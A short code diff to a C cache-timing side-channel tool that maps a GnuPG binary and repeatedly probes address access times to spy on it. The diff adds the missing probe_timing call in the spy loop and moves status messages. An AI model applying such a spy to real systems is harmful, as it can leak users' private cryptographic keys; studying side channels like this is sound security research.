@@ -62,10 +62,10 @@ unsigned long probe_timing(char *adrs) {
 }
 
 void spy(char **addrs, size_t num_addrs, FILE *out_file) {
-    printf("Started spying\n", slot);
     for (int slot = 0; slot < 10000; slot++) {
         for (int addr = 0; addr < (int) num_addrs; addr++) {
             char *ptr = addrs[addr];
+            unsigned long result = probe_timing(ptr);
             fprintf(out_file, "%d %d %lu\n", slot, addr, result);
             if (result < PROBE_THRESHOLD) {
                 fprintf(out_file, "%d %d %lu\n", slot, addr, result);
@@ -123,13 +123,14 @@ int main(int argc, char *argv[]) {
     }
 
     // ATTAAAAACK!
+    printf("Started spying\n");
     spy(addrs, num_addrs, arguments.out_file);
+    printf("Finished spying\n");
 
     // Probably never reached because we'll likely just ^C the program. Maybe
     // implement a SIGTERM / SIGINT handler?
     munmap(gpg_base, map_len);
     cleanup_args(&arguments);
-    printf("Finished\n");
     return 0;
 }
 
